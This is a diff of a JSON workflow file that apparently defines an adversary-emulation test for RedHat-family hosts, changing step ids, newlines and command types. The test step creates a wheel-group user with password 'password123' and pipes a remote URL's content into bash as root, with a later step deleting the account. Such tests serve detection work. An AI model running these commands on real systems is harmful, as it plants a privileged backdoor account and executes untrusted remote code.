@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "ce154f1a-c7a5-4c61-b198-b4714f56dc01",
+      "id": "173236b7-6b8e-483c-affd-453c82e73e81",
       "type": "execute-command",
       "data": {
-        "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
+        "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash",
         "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "7eb4b796-ec81-4545-afbe-aa55dea2d0ed",
+      "id": "81c462dc-fee2-4b0f-bc9f-70b62023ec8e",
       "type": "execute-command",
       "data": {
-        "command": "userdel -fr art\n",
+        "command": "userdel -fr art",
         "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "a691233e-30e8-455d-b732-e37ff142bf0c",
+      "id": "0bf34725-e601-43cc-8129-48775db3e80e",
       "name": "Check dependency 1/1",
       "description": "Check if running on a Redhat based machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
-        "command_type": ""
+        "command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi",
+        "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "321b279e-0226-4573-9563-2326c6070f9c",
+      "id": "41a3ca7f-6cf2-47fb-bebb-3d695161522f",
       "name": "Resolve dependency 1/1",
       "description": "Check if running on a Redhat based machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "yum update \u0026\u0026 yum install -y openssl sudo curl\n",
-        "command_type": ""
+        "command": "yum update \u0026\u0026 yum install -y openssl sudo curl",
+        "command_type": "bash"
       },
       "elevation_required": true
     },
     {
-      "id": "e27cd666-20c8-4dae-b1eb-f9480693f889",
+      "id": "aaaa10f2-2b11-4110-b50b-ffdba49fae66",
       "name": "Re-check dependency 1/1",
       "description": "Check if running on a Redhat based machine.\n",
       "type": "execute-command",
       "data": {
-        "command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
-        "command_type": ""
+        "command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi",
+        "command_type": "bash"
       },
       "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "ce154f1a-c7a5-4c61-b198-b4714f56dc01",
+      "s": "173236b7-6b8e-483c-affd-453c82e73e81",
       "p": "on-success",
-      "o": "7eb4b796-ec81-4545-afbe-aa55dea2d0ed"
+      "o": "81c462dc-fee2-4b0f-bc9f-70b62023ec8e"
     },
     {
-      "s": "ce154f1a-c7a5-4c61-b198-b4714f56dc01",
+      "s": "173236b7-6b8e-483c-affd-453c82e73e81",
       "p": "on-failure",
-      "o": "7eb4b796-ec81-4545-afbe-aa55dea2d0ed"
+      "o": "81c462dc-fee2-4b0f-bc9f-70b62023ec8e"
     },
     {
-      "s": "a691233e-30e8-455d-b732-e37ff142bf0c",
+      "s": "0bf34725-e601-43cc-8129-48775db3e80e",
       "p": "on-success",
-      "o": "ce154f1a-c7a5-4c61-b198-b4714f56dc01"
+      "o": "173236b7-6b8e-483c-affd-453c82e73e81"
     },
     {
-      "s": "a691233e-30e8-455d-b732-e37ff142bf0c",
+      "s": "0bf34725-e601-43cc-8129-48775db3e80e",
       "p": "on-failure",
-      "o": "321b279e-0226-4573-9563-2326c6070f9c"
+      "o": "41a3ca7f-6cf2-47fb-bebb-3d695161522f"
     },
     {
-      "s": "321b279e-0226-4573-9563-2326c6070f9c",
+      "s": "41a3ca7f-6cf2-47fb-bebb-3d695161522f",
       "p": "on-success",
-      "o": "e27cd666-20c8-4dae-b1eb-f9480693f889"
+      "o": "aaaa10f2-2b11-4110-b50b-ffdba49fae66"
     },
     {
-      "s": "e27cd666-20c8-4dae-b1eb-f9480693f889",
+      "s": "aaaa10f2-2b11-4110-b50b-ffdba49fae66",
       "p": "on-failure",
-      "o": "ce154f1a-c7a5-4c61-b198-b4714f56dc01"
+      "o": "173236b7-6b8e-483c-affd-453c82e73e81"
     }
   ],
   "tags": [
